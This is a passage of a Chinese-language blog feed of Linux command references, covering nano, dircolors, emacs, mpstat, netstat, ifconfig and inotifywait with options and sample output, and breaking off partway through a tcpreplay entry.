--autoindent 自动缩进新行 -k --cut 从游标剪切至行尾 -l --nofollow 不要依照符号连结，而是覆盖 -m --mouse 启用鼠标功能 -o &lt;目录&gt; --operatingdir=&lt;目录&gt; 设定操作目录 -p --preserve 保留 XON (^Q) 和 XOFF (^S) 按键 -q --quiet 沉默忽略启动问题, 比如 rc 文件错误 -r &lt;#列数&gt; --fill=&lt;#列数&gt; 设定折行宽度为 #列数 -s &lt;程序&gt; --speller=&lt;程序&gt; 启用替代的拼写检查程序 -t --tempfile 离开时自动储存，不要提示 -u --undo 允许通用撤销[试验性特性 ] -v --view 查看 (只读) 模式 -w --nowrap 不要自动换行 -x --nohelp 不要显示辅助区 -z --suspend 启用暂停功能 -$ --softwrap 启用软换行 -a, -b, -e, -f, -g, -j (忽略，为与 pico 相容) 用法 光标控制 移动光标：使用用方向键移动。 选择文字：按住鼠标左键拖到。 复制、剪贴和粘贴 复制一整行：Alt+6 剪贴一整行：Ctrl+K 粘贴：Ctrl+U 如果需要复制／剪贴多行或者一行中的一部分，先将光标移动到需要复制／剪贴的文本的开头，按 Ctrl+6（或者 Alt+A）做标记，然后移动光标到 待复制／剪贴的文本末尾。这时选定的文本会反白，用 Alt+6 来复制，Ctrl+K 来剪贴。若在选择文本过程中要取消，只需要再按一次 Ctrl+6。 搜索 按 Ctrl+W，然后输入你要搜索的关键字，回车确定。这将会定位到第一个匹配的文本，接着可以用 Alt+W 来定位到下一个匹配的文本。 翻页 Ctrl+Y 到上一页 Ctrl+V 到下一页 保存 使用 Ctrl+O 来保存所做的修改 退出 按 Ctrl+X 如果你修改了文件，下面会询问你是否需要保存修改。输入 Y 确认保存，输入 N 不保存，按 Ctrl+C 取消返回。如果输入了 Y，下一步会让你输入想要保存的文件名。如果不需要修改文件名直接回车就行；若想要保存成别的名字（也就是另存为）则输入新名称然后确 定。这个时候也可用 Ctrl+C 来取消返回。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nano","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nano/","stats":{"text":"5 min read","time":247000,"words":1092,"minutes":5},"date":"2022-02-02 16:40:16","dateFormat":"2022-02-02"},{"content":"置 ls 命令在显示目录或文件时所用的色彩。 补充说明 dircolors 命令设置 ls 命令在显示目录或文件时所用的色彩。dircolors 可根据[色彩配置文件 ] 来设置 LS_COLORS 环境变量或是显示设置 LS_COLORS 环境变量的命令。 语法 dircolors (选项) (参数) 选项 -b 或--sh 或--bourne-shell：显示在 Boume shell 中，将 LS_COLORS 设为目前预设置的 shell 指令； -c 或--csh 或--c-shell：显示在 C shell 中，将 LS_COLORS 设为目前预设置的 shell 指令； -p 或--print-database：显示预设置； -help：显示帮助； -version：显示版本信息。 参数 文件：指定用来设置颜色的文件。 实例 [root@localhost ~]# dircolors -p # Configuration file for dircolors, a utility to help you set the # LS_COLORS environment variable used by GNU ls with the --color option. # The keywords COLOR, OPTIONS, and EIGHTBIT (honored by the # slackware version of dircolors) are recognized but ignored. # Below, there should be one TERM entry for each termtype that is colorizable TERM linux TERM linux-c TERM mach-color TERM console TERM con132x25 TERM con132x30 TERM con132x43 TERM con132x60 TERM con80x25 TERM con80x28 TERM con80x30 TERM con80x43 TERM con80x50 TERM con80x60 TERM cygwin TERM dtterm TERM putty TERM xterm TERM xterm-color TERM xterm-debian TERM rxvt TERM screen TERM screen-bce TERM screen-w TERM vt100 TERM Eterm # Below are the color init strings for the basic file types. A color init # string consists of one or more of the following numeric codes: # Attribute codes: # 00=none 01=bold 04=underscore 05=blink 07=reverse 08=concealed # Text color codes: # 30=black 31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 37=white # Background color codes: # 40=black 41=red 42=green 43=yellow 44=blue 45=magenta 46=cyan 47=white NORMAL 00 # global default, although everything should be something. FILE 00 # normal file DIR 01;34 # directory LINK 01;36 # symbolic link. (If you set this to 'target' instead of a # numerical value, the color is as for the file pointed to.) FIFO 40;33 # pipe SOCK 01;35 # socket DOOR 01;35 # door BLK 40;33;01 # block device driver CHR 40;33;01 # character device driver ORPHAN 40;31;01 # symlink to nonexistent file SETUID 37;41 # file that is setuid (u+s) SETGID 30;43 # file that is setgid (g+s) STICKY_OTHER_WRITABLE 30;42 # dir that is sticky and other-writable (+t,o+w) OTHER_WRITABLE 34;42 # dir that is other-writable (o+w) and not sticky STICKY 37;44 # dir with the sticky bit set (+t) and not other-writable # This is for files with execute permission: exec 01;32 # List any file extensions like '.gz' or '.tar' that you would like ls # to colorize below. Put the extension, a space, and the color init string. # (and any comments you want to add after a '#') # If you use DOS-style suffixes, you may want to uncomment the following: #.cmd 01;32 # executables (bright green) #.exe 01;32 #.com 01;32 #.btm 01;32 #.bat 01;32 .tar 01;31 # archives or compressed (bright red) .tgz 01;31 .arj 01;31 .taz 01;31 .lzh 01;31 .zip 01;31 .z 01;31 .Z 01;31 .gz 01;31 .bz2 01;31 .deb 01;31 .rpm 01;31 .jar 01;31 # image formats .jpg 01;35 .jpeg 01;35 .gif 01;35 .bmp 01;35 .pbm 01;35 .pgm 01;35 .ppm 01;35 .tga 01;35 .xbm 01;35 .xpm 01;35 .tif 01;35 .tiff 01;35 .png 01;35 .mov 01;35 .mpg 01;35 .mpeg 01;35 .avi 01;35 .fli 01;35 .gl 01;35 .dl 01;35 .xcf 01;35 .xwd 01;35 # audio formats .flac 01;35 .mp3 01;35 .mpc 01;35 .ogg 01;35 .wav 01;35 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dircolors","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dircolors/","stats":{"text":"4 min read","time":238000,"words":703,"minutes":4},"date":"2022-02-02 16:40:01","dateFormat":"2022-02-02"},{"content":"功能强大的全屏文本编辑器。 补充说明 emacs 命令是由 GNU 组织的创始人 Richard Stallman 开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用 emacs。 语法 emacs (选项) (参数) 选项 +&lt;行号&gt;：启动 emacs 编辑器，并将光标移动到制定行号的行； -q：启动 emacs 编辑器，而不加载初始化文件； -u&lt;用户&gt;：启动 emacs 编辑器时，加载指定用户的初始化文件； -t&lt;文件&gt;：启动 emacs 编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）； -f&lt;函数&gt;：执行指定 lisp（广泛应用于人工智能领域的编程语言）函数； -l&lt;lisp 代码文件&gt;：加载指定的 lisp 代码文件； -batch：以批处理模式运行 emacs 编辑器。 参数 文件：指定要编辑的文本文件。 emacs 命令操作大全 基本命令 C-x C-c : 退出 Emacs C-x C-f : 打开一个文件，如果文件不存在，则创建一个文件 C-g : 取消未完成的命令 编辑 C-z (redefined): Undo；原来 C-z 是挂起 Emacs（然后用 fg 命令调出）；C-x u 是默认的命令； 移动一下光标，再 C-z 就可以 redo M-d : 删除光标后的词语 移动光标 C-v : 向前翻页 M-v : 向后翻页 M-r : 将光标移动到屏幕中间那行 C-a : 移到行首 M-a : 移到句首，从行首到句首之间可能有空格 C-e : 移到行尾 M-e : 移到句尾 M-{ : 向上移动一段 M-} : 向下移动一段 C-right : 向前移动一个单词 C-left : 向后移动一个单词 C-up : 向前移动一段 C-down : 向后移动一段 M-&lt; : 移到整个文本开头 M-&gt; : 移到整个文本末尾 C-u 数字 命令 : 执行多次 (数字表示次数) 该命令；&quot;M-数字 命令&quot; 也可以 M-x goto-line : 移动到某一行 C-l : 重绘屏幕，效果就是当前编辑行移动窗口中央 Buffer 相关 C-x k : 关闭当前 buffer C-x b : 切换到前一个编辑的 buffer C-x C-b : 列出当前所有 buffer C-x C-s : 保存当前 buffer C-x s : 保存所有未保存的 buffer，会提示你是否需要保存 C-x C-w : 文件另存为 拷贝与粘贴 M-space (redefined): 设置 mark; C-@ 是默认命令 C-w (redefined) : 剪切一块区域；如果没有设置 mark，则是剪切一行 M-w (redefined) : 拷贝一块区域；如果没有设置 mark, 则是拷贝一行 C-k : 从当前位置剪切到行尾 C-y : 粘贴 M-y : 用 C-y 拉回最近被除去的文本后，换成 M-y 可以拉回以前被除去的文本。键入多次的 M-y 可以拉回更早以前被除去的文本。 C-x r k : 执行矩形区域的剪切 C-x r y : 执行矩形区域的粘贴 窗口操作 C-x 0 : 关闭当前窗口 C-x 1 : 将当前窗口最大化 C-x 2 : 垂直分割窗口 C-x 3 : 水平分割窗口 M-o (redefined) : 在窗口之间切换; C-x o 是默认命令 C-x 5 1/2/3/0 : 对 frame 类似的操作 C-x &lt; : 窗口内容右卷 C-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用） (C-u) C-x ^ : 加高当前窗口，如果有 C-u，则每次加高 4 行 (C-u) C-x } : 加宽当前窗口 (C-u) C-x { : 压窄当前窗口 ESC C-v : 在其它窗口进行卷屏操作 搜索和替换 C-s : 向前搜索（增量式搜索）；连续 C-s，跳到下一个搜索到的目标 C-s RET : 普通搜索 C-r : 向前搜索 C-s RET C-w : 按单词查询 M-% : 查询替换，也就是替换前会询问一下 M-x replace-string : 普通替换 Tags M-! etags .c .h : 创建 TAGS 文件 M-. : 跳到 tag 所在位置 M-x list-tags : 列出 tags 书签 C-x r m : 设置书签 bookmark C-x r b : 跳到 bookmark 处 帮助 C-h ? : 查看帮助信息 C-h f : 查看一个函数 C-h v : 查看一个变量 C-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略) C-h C-f : 查看一个函数的 info，非常有用 C-h i : 看 Info 其它 C-M-\\ : 对选中区域，按照某种格式 (比如 C 程序) 进行格式化 C-x h : 全部选中 M-! : 执行外部 shell 命令 M-x shell : 模拟 shell 的 buffer M-x term : 模拟 terminal, C-c k 关闭 terminal C-x C-q : 修改 buffer 的只读属性 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"emacs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/emacs/","stats":{"text":"5 min read","time":299000,"words":1233,"minutes":5},"date":"2022-02-02 16:39:46","dateFormat":"2022-02-02"},{"content":"显示各个可用 CPU 的状态。 补充说明 mpstat 命令指令主要用于多 CPU 环境下，它显示各个可用 CPU 的状态系你想。这些信息存放在/proc/stat文件中。在多 CPUs 系统里，其不但能查看所有 CPU 的平均状况信息，而且能够查看特定 CPU 的信息。 语法 mpstat (选项) (参数) 选项 -P：指定 CPU 编号。 参数 间隔时间：每次报告的间隔时间（秒）； 次数：显示报告的次数。 实例 当 mpstat 不带参数时，输出为从系统启动以来的平均值。 mpstat Linux 2.6.9-5.31AXsmp (builder.redflag-linux.com) 12/16/2005 09:38:46 AM CPU %user %nice %system %iowait %irq %soft %idle intr/s 09:38:48 AM all 23.28 0.00 1.75 0.50 0.00 0.00 74.47 1018.59 每 2 秒产生了 2 个处理器的统计数据报告： 下面的命令可以每 2 秒产生了 2 个处理器的统计数据报告，一共产生三个 interval 的信息，然后再给出这三个 interval 的平均信息。默认时，输出是按照 CPU 号排序。第一个行给出了从系统引导以来的所有活跃数据。接下来每行对应一个处理器的活跃状态。。 mpstat -P ALL 2 3 Linux 2.6.18-164.el5 (server.sys.com) 01/04/2010 09:34:20 PM CPU %user %nice %sys %iowait %irq %soft %steal %idle intr/s 09:34:22 PM all 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.00 1001.49 09:34:22 PM 0 0.00 0.00 0.50 0.00 0.00 0.00 0.00 99.50 1001.00 09:34:22 PM 1 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.00 0.00 比较带参数和不带参数的 mpstat 的结果： 在后台开一个 2G 的文件 cat 1.img &amp; 然后在另一个终端运行 mpstat 命令 mpstat Linux 2.6.18-164.el5 (server.sys.com) 01/04/2010 10:17:31 PM CPU %user %nice %sys %iowait %irq %soft %steal %idle intr/s 10:17:31 PM all 0.07 0.02 0.25 0.21 0.01 0.04 0.00 99.40 1004.57 mpstat Linux 2.6.18-164.el5 (server.sys.com) 01/04/2010 10:17:35 PM CPU %user %nice %sys %iowait %irq %soft %steal %idle intr/s 10:17:35 PM all 0.07 0.02 0.25 0.21 0.01 0.04 0.00 99.39 1004.73 mpstat 3 10 Linux 2.6.18-164.el5 (server.sys.com) 01/04/2010 10:17:55 PM CPU %user %nice %sys %iowait %irq %soft %steal %idle intr/s 10:17:58 PM all 13.12 0.00 20.93 0.00 1.83 9.80 0.00 54.32 2488.08 10:18:01 PM all 10.82 0.00 19.30 0.83 1.83 9.32 0.00 57.90 2449.83 10:18:04 PM all 10.95 0.00 20.40 0.17 1.99 8.62 0.00 57.88 2384.05 10:18:07 PM all 10.47 0.00 18.11 0.00 1.50 8.47 0.00 61.46 2416.00 10:18:10 PM all 11.81 0.00 22.63 0.00 1.83 11.98 0.00 51.75 2210.60 10:18:13 PM all 6.31 0.00 10.80 0.00 1.00 5.32 0.00 76.58 1795.33 10:18:19 PM all 1.75 0.00 3.16 0.75 0.25 1.25 0.00 92.85 1245.18 10:18:22 PM all 11.94 0.00 19.07 0.00 1.99 8.29 0.00 58.71 2630.46 10:18:25 PM all 11.65 0.00 19.30 0.50 2.00 9.15 0.00 57.40 2673.91 10:18:28 PM all 11.44 0.00 21.06 0.33 1.99 10.61 0.00 54.56 2369.87 Average: all 9.27 0.00 16.18 0.30 1.50 7.64 0.00 65.11 2173.54 上两表显示出当要正确反映系统的情况，需要正确使用命令的参数。vmstat 和 iostat 也需要注意这一问题。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mpstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mpstat/","stats":{"text":"5 min read","time":274000,"words":882,"minutes":5},"date":"2022-02-02 16:39:26","dateFormat":"2022-02-02"},{"content":"查看 Linux 中网络系统状态信息。 补充说明 netstat 命令用来打印 Linux 中网络系统的状态信息，可让你得知整个 Linux 系统的网络情况。 语法 netstat (选项) 选项 -a 或--all：显示所有连线中的 Socket； -A&lt;网络类型&gt;或--&lt;网络类型&gt;：列出该网络类型连线中的相关地址； -c 或--continuous：持续列出网络状态； -C 或--cache：显示路由器配置的快取信息； -e 或--extend：显示网络其他相关信息； -F 或--fib：显示 FIB； -g 或--groups：显示多重广播功能群组组员名单； -h 或--help：在线帮助； -i 或--interfaces：显示网络界面信息表单； -l 或--listening：显示监控中的服务器的 Socket； -M 或--masquerade：显示伪装的网络连线； -n 或--numeric：直接使用 ip 地址，而不通过域名服务器； -N 或--netlink 或--symbolic：显示网络硬件外围设备的符号连接名称； -o 或--timers：显示计时器； -p 或--programs：显示正在使用 Socket 的程序识别码和程序名称； -r 或--route：显示 Routing Table； -s 或--statistice：显示网络工作信息统计表； -t 或--tcp：显示 TCP 传输协议的连线状况； -u 或--udp：显示 UDP 传输协议的连线状况； -v 或--verbose：显示指令执行过程； -V 或--version：显示版本信息； -w 或--raw：显示 RAW 传输协议的连线状况； -x 或--unix：此参数的效果和指定&quot;-A unix&quot;参数相同； --ip 或--inet：此参数的效果和指定&quot;-A inet&quot;参数相同。 实例 列出所有端口 (包括监听和未监听的) netstat -a #列出所有端口 netstat -at #列出所有 tcp 端口 netstat -au #列出所有 udp 端口 列出所有处于监听状态的 Sockets netstat -l #只显示监听端口 netstat -lt #只列出所有监听 tcp 端口 netstat -lu #只列出所有监听 udp 端口 netstat -lx #只列出所有监听 UNIX 端口 显示每个协议的统计信息 netstat -s 显示所有端口的统计信息 netstat -st 显示 TCP 端口的统计信息 netstat -su 显示 UDP 端口的统计信息 ```shell **在 netstat 输出中显示 PID 和进程名称** ```shell netstat -pt netstat -p可以与其它开关一起使用，就可以添加“PID/进程名称”到 netstat 输出中，这样 debugging 的时候可以很方便的发现特定端口运行的程序。 在 netstat 输出中不显示主机，端口和用户名 (host, port or user) 当你不想让主机，端口和用户名显示，使用netstat -n。将会使用数字代替那些名称。同样可以加速输出，因为不用进行比对查询。 netstat -an 如果只是不想让这三个名称中的一个被显示，使用以下命令: netsat -a --numeric-ports netsat -a --numeric-hosts netsat -a --numeric-users 持续输出 netstat 信息 netstat -c #每隔一秒输出网络信息 显示系统不支持的地址族 (Address Families) netstat --verbose 在输出的末尾，会有如下的信息： netstat: no support for `AF IPX' on this system. netstat: no support for `AF AX25' on this system. netstat: no support for `AF X25' on this system. netstat: no support for `AF NETROM' on this system. 显示核心路由信息 netstat -r 使用netstat -rn显示数字格式，不查询主机名称。 找出程序运行的端口 并不是所有的进程都能找到，没有权限的会不显示，使用 root 权限查看所有的信息。 netstat -ap | grep ssh 找出运行在指定端口的进程： netstat -an | grep ':80' 通过端口找进程 ID netstat -anp|grep 8081 | grep LISTEN|awk '{printf $7}'|cut -d/ -f1 显示网络接口列表 netstat -i 显示详细信息，像是 ifconfig 使用netstat -ie。 IP 和 TCP 分析 查看连接某服务端口最多的的 IP 地址： netstat -ntu | grep :80 | awk '{print $5}' | cut -d: -f1 | awk '{++ip[$1]} END {for(i in ip) print ip[i],&quot;&lt;span title=&quot;\\t&quot;&gt;\\t&quot;,i}' | sort -nr TCP 各种状态列表： netstat -nt | grep -e 127.0.0.1 -e 0.0.0.0 -e ::: -v | awk '/^tcp/ {++state[$NF]} END {for(i in state) print i,&quot;&lt;span title=&quot;\\t&quot;&gt;\\t&quot;,state[i]}' 查看 phpcgi 进程数，如果接近预设值，说明不够用，需要增加： netstat -anpo | grep &quot;php-cgi&quot; | wc -l ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"netstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/netstat/","stats":{"text":"5 min read","time":265000,"words":1071,"minutes":5},"date":"2022-02-02 16:39:12","dateFormat":"2022-02-02"},{"content":"配置和显示 Linux 系统网卡的网络参数。 补充说明 ifconfig 命令被用于配置和显示 Linux 内核中网络接口的网络参数。用 ifconfig 命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了。 语法 ifconfig (参数) 参数 add&lt;地址&gt;：设置网络设备 IPv6 的 ip 地址； del&lt;地址&gt;：删除网络设备 IPv6 的 IP 地址； down：关闭指定的网络设备； &lt;hw&lt;网络设备类型&gt;&lt;硬件地址&gt;：设置网络设备的类型与硬件地址； io_addr&lt;I/O 地址&gt;：设置网络设备的 I/O 地址； irq&lt;IRQ 地址&gt;：设置网络设备的 IRQ； media&lt;网络媒介类型&gt;：设置网络设备的媒介类型； mem_start&lt;内存地址&gt;：设置网络设备在主内存所占用的起始地址； metric&lt;数目&gt;：指定在计算数据包的转送次数时，所要加上的数目； mtu&lt;字节&gt;：设置网络设备的 MTU； netmask&lt;子网掩码&gt;：设置网络设备的子网掩码； tunnel&lt;地址&gt;：建立 IPv4 与 IPv6 之间的隧道通信地址； up：启动指定的网络设备； -broadcast&lt;地址&gt;：将要送往指定地址的数据包当成广播数据包来处理； -pointopoint&lt;地址&gt;：与指定地址的网络设备建立直接连线，此模式具有保密功能； -promisc：关闭或启动指定网络设备的 promiscuous 模式； IP 地址：指定网络设备的 IP 地址； 网络设备：指定网络设备的名称。 实例 显示网络设备信息（激活状态的）： [root@localhost ~]# ifconfig eth0 Link encap:Ethernet HWaddr 00:16:3E:00:1E:51 inet addr:10.160.7.81 Bcast:10.160.15.255 Mask:255.255.240.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:61430830 errors:0 dropped:0 overruns:0 frame:0 TX packets:88534 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:3607197869 (3.3 GiB) TX bytes:6115042 (5.8 MiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:56103 errors:0 dropped:0 overruns:0 frame:0 TX packets:56103 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:5079451 (4.8 MiB) TX bytes:5079451 (4.8 MiB) 说明： eth0 表示第一块网卡，其中HWaddr表示网卡的物理地址，可以看到目前这个网卡的物理地址 (MAC 地址）是00:16:3E:00:1E:51。 inet addr 用来表示网卡的 IP 地址，此网卡的 IP 地址是10.160.7.81，广播地址Bcast:10.160.15.255，掩码地址Mask:255.255.240.0。 lo 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 httpd 服务器的指定到回坏地址，在浏览器输入 127.0.0.1 就能看到你所架 WEB 网站了。但只是您能看得到，局域网的其它主机或用户无从知道。 第一行：连接类型：Ethernet（以太网）HWaddr（硬件 mac 地址）。 第二行：网卡的 IP 地址、子网、掩码。 第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500 字节。 第四、五行：接收、发送数据包情况统计。 第七行：接收、发送数据字节数统计信息。 启动关闭指定网卡： ifconfig eth0 up ifconfig eth0 down ifconfig eth0 up为启动网卡 eth0，ifconfig eth0 down为关闭网卡 eth0。ssh 登陆 linux 服务器操作要小心，关闭了就不能开启了，除非你有多网卡。 为网卡配置和删除 IPv6 地址： ifconfig eth0 add 33ffe:3240:800:1005::2/64 #为网卡 eth0 配置 IPv6 地址 ifconfig eth0 del 33ffe:3240:800:1005::2/64 #为网卡 eth0 删除 IPv6 地址 用 ifconfig 修改 MAC 地址： ifconfig eth0 hw ether 00:AA:BB:CC:dd:EE 配置 IP 地址： [root@localhost ~]# ifconfig eth0 192.168.2.10 [root@localhost ~]# ifconfig eth0 192.168.2.10 netmask 255.255.255.0 [root@localhost ~]# ifconfig eth0 192.168.2.10 netmask 255.255.255.0 broadcast 192.168.2.255 启用和关闭 arp 协议： ifconfig eth0 arp #开启网卡 eth0 的 arp 协议 ifconfig eth0 -arp #关闭网卡 eth0 的 arp 协议 设置最大传输单元： ifconfig eth0 mtu 1500 #设置能通过的最大数据包大小为 1500 bytes 其它实例 ifconfig #处于激活状态的网络接口 ifconfig -a #所有配置的网络接口，不论其是否激活 ifconfig eth0 #显示 eth0 的网卡信息 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ifconfig","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ifconfig/","stats":{"text":"5 min read","time":298000,"words":1179,"minutes":5},"date":"2022-02-02 16:38:48","dateFormat":"2022-02-02"},{"content":"异步文件系统监控机制。 补充说明 Inotify 一种强大的、细粒度的、异步文件系统监控机制，它满足各种各样的文件监控需要，可以监控文件系统的访问属性、读写属性、权限属性、删除创建、移动等操作，也就是可以监控文件发生的一切变化。。 inotify-tools 是一个 C 库和一组命令行的工作提供 Linux 下 inotify 的简单接口。inotify-tools 安装后会得到inotifywait和inotifywatch这两条命令： inotifywait 命令可以用来收集有关文件访问信息，Linux 发行版一般没有包括这个命令，需要安装 inotify-tools，这个命令还需要将 inotify 支持编译入 Linux 内核，好在大多数 Linux 发行版都在内核中启用了 inotify。 inotifywatch 命令 用于收集关于被监视的文件系统的统计数据，包括每个 inotify 事件发生多少次。 开始之前需要检测系统内核是否支持 inotify： 使用uname -r命令检查 Linux 内核，如果低于 2.6.13，就需要重新编译内核加入 inotify 的支持。 使用ll /proc/sys/fs/inotify命令，是否有以下三条信息输出，如果没有表示不支持。 ll /proc/sys/fs/inotify total 0 -rw-r--r-- 1 root root 0 Jan 4 15:41 max_queued_events -rw-r--r-- 1 root root 0 Jan 4 15:41 max_user_instances -rw-r--r-- 1 root root 0 Jan 4 15:41 max_user_watches 安装 inotify-tools inotify-tools 项目地址：https://github.com/rvoicilas/inotify-tools inotify-tools 下载地址：http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz #CentOS release 5.8/64 位： tar zxvf inotify-tools-3.14.tar.gz cd inotify-tools-3.14 ./configure make make install 其他 Linux 发行版安装方法可以参见：https://github.com/rvoicilas/inotify-tools/wiki#wiki-getting inotify 相关参数 inotify 定义了下列的接口参数，可以用来限制 inotify 消耗 kernel memory 的大小。由于这些参数都是内存参数，因此，可以根据应用需求，实时的调节其大小： /proc/sys/fs/inotify/max_queued_evnets表示调用 inotify_init 时分配给 inotify instance 中可排队的 event 的数目的最大值，超出这个值的事件被丢弃，但会触发 IN_Q_OVERFLOW 事件。 /proc/sys/fs/inotify/max_user_instances表示每一个 real user id 可创建的 inotify instatnces 的数量上限。 /proc/sys/fs/inotify/max_user_watches表示每个 inotify instatnces 可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。 根据以上在 32 位或者 64 位系统都可以执行： echo 104857600 &gt; /proc/sys/fs/inotify/max_user_watches echo 'echo 104857600 &gt; /proc/sys/fs/inotify/max_user_watches' &gt;&gt; /etc/rc.local 如果遇到以下错误： inotifywait: error while loading shared libraries: libinotifytools.so.0: cannot open shared object file: No such file or directory **解决方法：** 32 位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib/libinotifytools.so.0 64 位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib64/libinotifytools.so.0 inotifywait 命令使用 #!/bin/bash #filename watchdir.sh path=$1 /usr/local/bin/inotifywait -mrq --timefmt '%d/%m/%y/%H:%M' --format '%T %w %f' -e modify,delete,create,attrib $path 执行输出： ./watchdir.sh /data/wsdata/tools/ 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp 04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp 04/01/13/16:35 /data/wsdata/tools/ 4913 04/01/13/16:35 /data/wsdata/tools/ 4913 04/01/13/16:35 /data/wsdata/tools/ 4913 04/01/13/16:35 /data/wsdata/tools/ j.jsp 04/01/13/16:35 /data/wsdata/tools/ j.jsp 04/01/13/16:35 /data/wsdata/tools/ j.jsp 04/01/13/16:35 /data/wsdata/tools/ j.jsp~ 04/01/13/16:35 /data/wsdata/tools/ .j.jsp.swp inotifywait 命令参数 -m是要持续监视变化。 -r使用递归形式监视目录。 -q减少冗余信息，只打印出需要的信息。 -e指定要监视的事件列表。 --timefmt是指定时间的输出格式。 --format指定文件变化的详细信息。 可监听的事件 事件 描述 access 访问 ，读取文件。 modify 修改 ，文件内容被修改。 attrib 属性 ，文件元数据被修改。 move 移动 ，对文件进行移动操作。 create 创建 ，生成新文件 open 打开 ，对文件进行打开操作。 close 关闭 ，对文件进行关闭操作。 delete 删除 ，文件被删除。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"inotifywait","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/inotifywait/","stats":{"text":"5 min read","time":298000,"words":1100,"minutes":5},"date":"2022-02-02 16:36:47","dateFormat":"2022-02-02"},{"content":"将 PCAP 包重新发送，用于性能或者功能测试。 补充说明 简单的说， tcpreplay 是一种 pcap 包的重放工具，它可以将用 ethreal、wireshark 工具抓下来的包原样或经过任意修改后重放回去。它允许你对报文做任意的修改（主要是指对 2 层、3 层、4 层报文头），指定重放报文的速度等，这样 tcpreplay 就可以用来复现抓包的情景以定位 bug，以极快的速度重放从而实现压力测试。 选项 -A &quot;&lt;args&gt;&quot; 在使用 tcpdump 风格打印输出信息时，同时再调用 tcpdump 中的参数， 默认已经带有“-n,-l”，所以一般看到的都是 ip 地址，而没有主机名的打印，注意这个是在 tcpreplay 使用了-v 参数时才能使用，不带-v 不会报错，但是没有实际意义。格式：-vA “nnt”表示以 tcpdump 风格输出报文信息，并且不打印时间戳、主机名、端口服务名称。注意不要使用-c 参数来指定打印的数据报文的个数，这样发送出去的报文也会变少。 -c &lt;cachefile&gt; 双网卡回放报文必选参数，后面紧跟 cache 文件名，该文件为 tcpprep 根据对应的 pcap 文件构造出来。 -D 把应用层的数据，使用 dump mode 写入到指定文件中去，和-w、-W 参数一起使用。 -e &lt;ip1:ip2&gt; 指定端点的 ip，即把发送报文的和接收的报文的 ip 都修改称对应的参数值中指定的 ip，但是这样发送的出的报文不会区分 client 和 server。。 -f &lt;configfile&gt; 指定配置文件。 -F 在发送报文时，自动纠正错误的校验和。对测试 DUT 的校验和检验。 -h 显示帮助文件。 -i &lt;nic&gt; 双网卡回放报文必选参数，指定主接口。 -I &lt;mac&gt; 重写主网卡发送出报文的目的 MAC 地址。 -j &lt;nic&gt; 双网卡回放报文必选参数，指定从接口。 -J &lt;mac&gt; 重写从网卡发送出报文的目的 MAC 地址。 -k &lt;mac&gt; 重写主网卡发送报文的源 MAC 地址。 -K &lt;mac&gt; 重写从网卡发送报文的源 MAC 地址。 -l &lt;loop&gt; 指定循环的次数。 -L &lt;limit&gt; 指定最大的发包数量。可以在确认连接的调试时使用。 -m &lt;multiple&gt; 指定一个倍数值，就是必默认发送速率要快多少倍的速率发送报文。 加大发送的速率后，对于 DUT 可能意味着有更多的并发连接和连接数，特别是对于 BT 报文的重放， 因为连接的超时是固定的，如果速率增大的话， 留在 session 表中的连接数量增大，还可以通过修改连接的超时时间来达到该目的。 -M 表示不发送“火星”的 ip 报文，man 文件中的定义是 